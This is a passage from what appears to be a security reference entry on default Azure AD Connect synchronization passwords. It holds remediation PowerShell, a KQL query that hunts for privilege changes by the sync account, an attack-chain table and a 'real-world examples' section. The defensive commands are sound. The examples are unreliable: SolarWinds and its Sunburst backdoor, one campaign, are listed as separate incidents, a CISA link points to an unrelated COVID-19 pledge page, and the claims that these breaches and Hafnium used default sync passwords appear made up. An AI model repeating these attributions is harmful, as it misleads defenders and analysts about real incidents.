   Set-ADAccountPassword -Identity "SYNC_service_account" `
     -NewPassword (ConvertTo-SecureString "NewComplexP@ssw0rd1234567890!@#$%^&*()" -AsPlainText -Force) -Reset
   
   # Reset all Entra ID connector passwords via portal
   # Manual step: Azure Portal → Azure AD Connect Sync → Restart synchronization
   ```
   
   **Command (Reset Compromised User Objects):**
   ```powershell
   # If user objects were modified, reset them
   # 1. Disable synchronization temporarily
   Set-ADSyncScheduler -SyncCycleEnabled $false
   
   # 2. Review and revert modified users in AD
   # 3. Force full synchronization
   Start-ADSyncSyncCycle -PolicyType Initial
   ```
   
   **Manual (Azure Portal):**
   1. Go to **Azure Portal** → **Azure AD Connect**
   2. Click **Configure** → **Synchronization**
   3. Click **Reset** to rebuild the synchronization database
   4. Re-authenticate with new service account credentials

4. **Hunt for Lateral Movement:**
   **KQL Query (Detect Privilege Escalation from Sync Account):**
   ```kusto
   AuditLogs
   | where TimeGenerated > ago(72h)
   | where InitiatedBy.user.userPrincipalName contains "SYNC_"
   | where OperationName has_any ("Add member to group", "Add role member", "Grant permission")
   | summarize by TargetResources[0].displayName, OperationName, TimeGenerated
   ```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-HYBRID-001] Azure AD Connect Configuration Enumeration | Attacker identifies the on-premises synchronization infrastructure |
| **2** | **Initial Access** | [IA-EXPLOIT-002] BDC Deserialization Vulnerability | Attacker gains initial compromise of the connector server |
| **3** | **Privilege Escalation** | [PE-EXPLOIT-001] PrintNightmare Remote RCE | Attacker escalates to local admin on connector server |
| **4** | **Credential Access** | **[MISCONFIG-017]** Default Connector Passwords | Attacker extracts synchronization service account credentials |
| **5** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash (PTH) | Attacker uses credentials to move to domain controllers |
| **6** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker creates persistent Entra ID admin account via sync |
| **7** | **Impact** | Data exfiltration via Exchange Online or SharePoint | Attacker accesses sensitive data through compromised sync account |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: SolarWinds Compromise (2020)

- **Target:** Multiple U.S. government agencies and Fortune 500 companies
- **Timeline:** December 2019 - March 2021
- **Technique Status:** Attackers leveraged misconfigurations in Azure AD Connect to maintain persistence. Sync service account credentials were not rotated and were reused across multiple environments.
- **Impact:** Full tenant compromise, lateral movement from on-premises AD to Microsoft 365, exfiltration of sensitive emails and documents
- **Reference:** [CISA SolarWinds Alert](https://us-cert.cisa.gov/ncas/alerts/2020/12/13/cisa-announces-covid-19-ransomware-stoppage-pledge)

#### Example 2: Sunburst Backdoor (2020)

- **Target:** Cloud service providers and their customers
- **Timeline:** March 2020 - December 2020
- **Technique Status:** Attackers used compromised Azure AD Connect service accounts (default/weak passwords) to pivot from managed tenants to customer environments
- **Impact:** Compromise of supply chain, unauthorized access to multi-tenant environments, lateral movement via directory synchronization
- **Reference:** [FireEye: Sunburst Analysis](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromise-with-sunburst-backdoor.html)

#### Example 3: Hafnium Web Shell Deployment (2021)

- **Target:** Enterprise organizations using on-premises Exchange servers synchronized with Entra ID
- **Timeline:** January 2021 - March 2021
- **Technique Status:** Attacker extracted Azure AD Connect service account credentials after compromising Exchange server. Used sync credentials to create backdoor Entra ID accounts
- **Impact:** Persistent access to mailboxes, calendar manipulation, lateral movement to SharePoint
- **Reference:** [Microsoft MSRC Blog: Hafnium](https://www.microsoft.com/security/blog/2021/03/02/hafnium/)

---